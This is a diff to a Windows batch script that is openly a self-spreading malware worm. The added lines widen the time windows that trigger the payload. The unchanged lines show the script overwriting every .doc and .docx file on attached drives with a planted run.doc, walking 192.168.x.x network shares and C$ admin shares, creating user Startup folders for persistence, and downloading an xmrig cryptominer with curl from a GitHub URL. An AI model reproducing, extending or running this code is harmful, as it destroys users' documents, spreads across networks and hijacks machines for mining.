@@ -14,6 +14,26 @@ if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.07 goto next1
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.08 goto next1
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.09 goto next1
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.10 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.11 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.12 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.13 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.14 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.15 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.16 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.17 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.18 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.19 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.20 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.21 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.22 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.23 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.24 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.25 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.26 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.27 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.28 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.29 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.30 goto next1
 goto skip
 :next1
 set daysofweek=Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday
@@ -96,6 +116,26 @@ if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.07 goto next1
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.08 goto next1
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.09 goto next1
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.10 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.11 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.12 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.13 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.14 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.15 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.16 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.17 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.18 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.19 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.20 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.21 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.22 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.23 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.24 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.25 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.26 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.27 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.28 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.29 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.30 goto next1
 
 if exist E: (for /f "delims=" %%h in ('dir E:\*.docx /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
 if exist F: (for /f "delims=" %%h in ('dir F:\*.docx /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
@@ -162,6 +202,26 @@ if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.07 goto next1
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.08 goto next1
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.09 goto next1
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.10 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.11 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.12 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.13 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.14 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.15 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.16 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.17 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.18 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.19 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.20 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.21 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.22 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.23 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.24 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.25 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.26 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.27 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.28 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.29 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.30 goto next1
 
 if exist E: (for /f "delims=" %%h in ('dir E:\*.docx /s /b') do ren "%%h" *.doc)
 if exist F: (for /f "delims=" %%h in ('dir F:\*.docx /s /b') do ren "%%h" *.doc)
@@ -228,6 +288,26 @@ if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.07 goto next1
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.08 goto next1
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.09 goto next1
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.10 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.11 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.12 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.13 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.14 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.15 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.16 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.17 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.18 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.19 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.20 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.21 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.22 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.23 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.24 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.25 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.26 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.27 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.28 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.29 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.30 goto next1
 
 if exist E: (for /f "delims=" %%h in ('dir E:\*.doc /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
 if exist F: (for /f "delims=" %%h in ('dir F:\*.doc /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
@@ -294,6 +374,26 @@ if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.07 goto next1
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.08 goto next1
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.09 goto next1
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.10 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.11 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.12 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.13 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.14 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.15 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.16 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.17 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.18 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.19 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.20 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.21 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.22 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.23 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.24 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.25 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.26 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.27 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.28 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.29 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.30 goto next1
 
 for /f %%x in ('net view \\192.168.%i%.%ii%') do pushd \\192.168.%i%.%ii%\%%x
 if exist A: (for /f %%x in ('dir A:\Users /b') do mkdir "A:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
@@ -369,6 +469,26 @@ if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.07 goto next1
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.08 goto next1
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.09 goto next1
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.10 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.11 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.12 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.13 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.14 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.15 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.16 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.17 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.18 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.19 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.20 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.21 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.22 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.23 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.24 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.25 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.26 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.27 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.28 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.29 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.30 goto next1
 
 if exist E: (for /f "delims=" %%h in ('dir E:\*.docx /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
 if exist F: (for /f "delims=" %%h in ('dir F:\*.docx /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
@@ -435,6 +555,26 @@ if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.07 goto next1
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.08 goto next1
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.09 goto next1
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.10 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.11 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.12 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.13 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.14 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.15 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.16 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.17 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.18 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.19 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.20 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.21 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.22 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.23 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.24 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.25 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.26 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.27 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.28 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.29 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.30 goto next1
 
 if exist E: (for /f "delims=" %%h in ('dir E:\*.docx /s /b') do ren "%%h" *.doc)
 if exist F: (for /f "delims=" %%h in ('dir F:\*.docx /s /b') do ren "%%h" *.doc)
@@ -501,6 +641,26 @@ if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.07 goto next1
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.08 goto next1
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.09 goto next1
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.10 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.11 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.12 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.13 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.14 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.15 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.16 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.17 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.18 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.19 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.20 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.21 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.22 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.23 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.24 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.25 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.26 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.27 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.28 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.29 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.30 goto next1
 
 if exist E: (for /f "delims=" %%h in ('dir E:\*.doc /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
 if exist F: (for /f "delims=" %%h in ('dir F:\*.doc /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
@@ -567,6 +727,26 @@ if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.07 goto next1
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.08 goto next1
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.09 goto next1
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.10 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.11 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.12 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.13 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.14 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.15 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.16 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.17 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.18 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.19 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.20 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.21 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.22 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.23 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.24 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.25 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.26 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.27 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.28 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.29 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.30 goto next1
 
 pushd \\192.168.%i%.%ii%\C$
 if exist A: (for /f %%x in ('dir A:\Users /b') do mkdir "A:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
@@ -642,6 +822,26 @@ if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.07 goto next1
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.08 goto next1
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.09 goto next1
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.10 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.11 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.12 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.13 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.14 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.15 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.16 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.17 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.18 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.19 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.20 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.21 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.22 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.23 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.24 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.25 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.26 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.27 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.28 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.29 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.30 goto next1
 
 if exist E: (for /f "delims=" %%h in ('dir E:\*.docx /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
 if exist F: (for /f "delims=" %%h in ('dir F:\*.docx /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
@@ -708,6 +908,26 @@ if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.07 goto next1
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.08 goto next1
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.09 goto next1
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.10 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.11 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.12 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.13 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.14 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.15 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.16 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.17 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.18 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.19 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.20 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.21 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.22 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.23 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.24 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.25 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.26 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.27 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.28 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.29 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.30 goto next1
 
 if exist E: (for /f "delims=" %%h in ('dir E:\*.docx /s /b') do ren "%%h" *.doc)
 if exist F: (for /f "delims=" %%h in ('dir F:\*.docx /s /b') do ren "%%h" *.doc)
@@ -774,6 +994,26 @@ if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.07 goto next1
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.08 goto next1
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.09 goto next1
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.10 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.11 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.12 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.13 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.14 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.15 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.16 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.17 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.18 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.19 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.20 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.21 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.22 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.23 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.24 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.25 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.26 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.27 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.28 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.29 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.30 goto next1
 
 if exist E: (for /f "delims=" %%h in ('dir E:\*.doc /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
 if exist F: (for /f "delims=" %%h in ('dir F:\*.doc /s /b') do copy /Y "C:\ProgramData\PSU\run.doc" "%%h")
@@ -840,6 +1080,26 @@ if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.07 goto next1
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.08 goto next1
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.09 goto next1
 if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.10 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.11 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.12 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.13 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.14 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.15 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.16 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.17 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.18 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.19 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.20 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.21 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.22 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.23 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.24 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.25 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.26 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.27 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.28 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.29 goto next1
+if %time:~0,2%.%time:~3,2%.%time:~6,2% == 12.00.30 goto next1
 
 if %ii% == 256 (goto next) else (set /a ii=ii+1)
 goto run
@@ -864,5 +1124,5 @@ timeout 0 >> nul
 del "C:\ProgramData\PSU\xmrig.exe"
 timeout 0 >> nul
 curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/xmrig.txt" -o "C:\ProgramData\PSU\xmrig.exe"
-timeout 3
+timeout 35
 goto run
